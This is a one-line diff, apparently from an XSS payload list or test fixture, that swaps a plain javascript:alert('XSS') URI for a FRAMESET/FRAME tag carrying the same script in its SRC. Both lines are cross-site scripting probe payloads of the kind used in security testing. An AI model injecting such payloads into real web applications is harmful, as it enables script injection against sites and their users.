@@ -1,1 +1,1 @@
-javascript:alert('XSS');
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
